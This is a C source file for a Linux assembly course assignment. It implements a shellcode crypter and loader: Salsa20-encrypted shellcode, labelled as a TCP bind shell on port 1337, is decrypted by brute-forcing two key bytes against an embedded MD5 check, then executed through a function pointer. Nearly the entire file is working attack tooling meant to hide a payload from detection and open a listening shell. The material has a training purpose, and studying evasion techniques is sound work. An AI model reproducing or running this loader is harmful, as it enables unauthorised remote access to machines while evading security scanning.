/*
; Filename: decrypt.c
; Author:   Stylianos Voukatas
; Website:  https://vostdev.wordpress.com/
;
; Purpose:  Assignment 7 for SLAE
; SLAE:     http://securitytube-training.com/onlinecourses/securitytube-linux-assembly-expert/

; Student ID: PA-27669
*/

#include <stdio.h>
#include <gcrypt.h>

#define MD5_DIGEST_LENGTH 16
#define true 1
#define false 0

// /bin/sh shellcode
//uint8_t encryptedShellCode[] = "\xb1\x67\x31\xed\x17\x5e\x1f\xd9\x50\xd6\x86\x4a\x13\x96\x56\x20\x01\x54\xbe\x42\xf4\x43\xde\x3a\x78\xd2\x6a\x67\xdb\xf3\xe3\x6e\xda\x9f\xec\xd9\xfe\x72\xa4\x4e\x91";
//uint8_t MD5[] = "\x9e\x21\xe7\x08\xbe\x53\x4d\x94\x95\xf5\x0f\x47\x5c\x3a\xc8\x42";

// tcp bind shell on port 1337
uint8_t encryptedShellCode[] = "\x1d\x9d\x61\x11\x06\x58\x38\xc3\x68\x97\x01\x17\xc3\x52\xad\xaf\x7c\x3b\x78\x12\x79\x0b\xe0\x54\x1b\xde\x14\xba\xe5\x9f\xbd\x12\xbb\xd1\x9b\xea\xc8\x86\xca\xc1\xc3\xd0\xd1\x9a\x3d\x06\x71\x29\x87\xcf\x6f\xfe\xc0\x57\x1d\x55\x2a\x63\xcc\x95\x4e\x8b\xba\x6a\x8b\x67\x57\x93\x9b\x4d\xb8\x24\x7f\xfb\xd8\x7a\x7f\x07\x18\x9f\xd7\xf0\xb7\xf2\x10\x8e\xf6\x27\xaf\x81\xed\x5d\xf2\x5b\xd2\x93\x3b\x6d\xe0\x90\xbb\xf4\xcd\xd0\x5f\x27\x03\x67\xb8\x42\x55\x06\x76\xb6\xcd\xe1\x32\x25\x9a\x39\x86\x6f\x5e\xc9\x25\xd3\xba\xd8\xc9\x59\x03\x9e\x7e\x86\x7a\xd7\xed\xce\x20";
uint8_t MD5[] = "\x99\x20\x07\x28\x8a\xc0\x91\xe0\x17\x92\x6b\x81\xce\x23\x76\x60";

static const char pool[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz"
        "!@#$%^&*()_+=-";

//declarations
static void decrypter(size_t len, uint8_t *buffer, char* key, char* nonce);
static void printBytes(uint8_t* arr, size_t len);
static int brute_force(size_t len, uint8_t *buffer, char* key, char* nonce);

int main(int argc, char* argv[])
{	

	// change them to what you like
	char key[] = "This is a very long weak key #RR"; // should be 32 bytes
	char nonce[] = "InitVctr"; // should be 8 bytes


	size_t len = strlen(encryptedShellCode);
	uint8_t *buffer = malloc(len);

	printf("Brute Forcing the key... ");	 
	// brute force the key
	int key_found = brute_force(len, buffer, key, nonce);	
	
	if(!key_found)
	{
		printf("\n\n [Key NOT Found, Abandon] \n\n");
		return -1;
	}

	printf("\n\nKEY Found: %s\n", key);

	//decrypter(len, buffer);	

	// Print decoded shellcode    
	printf("\nDecoded shellcode:\n");
	printBytes(buffer, len);	

	// jump md5 bytes and move the pointer to the shellcode
	buffer = buffer + MD5_DIGEST_LENGTH;
	
	int (*ret)() = (int(*)())buffer;
	printf("\nRunning shellcode...\n");
	
	ret();

	free(buffer);

	return 0;
}

// brute force the key
static int brute_force(size_t len, uint8_t *buffer, char* key, char* nonce)
{
	for(int i=0; i< sizeof(pool); i++)
	{
		for(int j=0; j< sizeof(pool); j++)
		{
			key[30] = pool[i];
			key[31] = pool[j];
			decrypter(len, buffer, key, nonce);

			printf("\n\nTrying with KEY: %s\n", key);
			printBytes(buffer, MD5_DIGEST_LENGTH);
			if(memcmp(MD5, buffer, MD5_DIGEST_LENGTH) == 0)
			{
				return true;			
			}

		}
		
	}

	// key not found
	return false;
}

// print the bytes
static void printBytes(uint8_t* arr, size_t len)
{
	for(int i=0; i<len; i++)
	{
		printf("\\x%02x", arr[i]);
   	}
   	printf("\n");	
}

// decrypts the encryptedShellCode array with SALSA20 cipher and puts the result to buffer
static void decrypter(size_t len, uint8_t *buffer, char* key, char* nonce)
{
    gcry_cipher_hd_t gcryCipherHd;

    gcry_cipher_open(&gcryCipherHd, GCRY_CIPHER_SALSA20, GCRY_CIPHER_MODE_STREAM, 0); // salsa20
    gcry_cipher_setkey(gcryCipherHd, key, 32); // 32 byte key
    gcry_cipher_setiv(gcryCipherHd, nonce, 8); // 8 byte nonce

    gcry_cipher_decrypt(gcryCipherHd, buffer, len, encryptedShellCode, len);

    gcry_cipher_close(gcryCipherHd);
}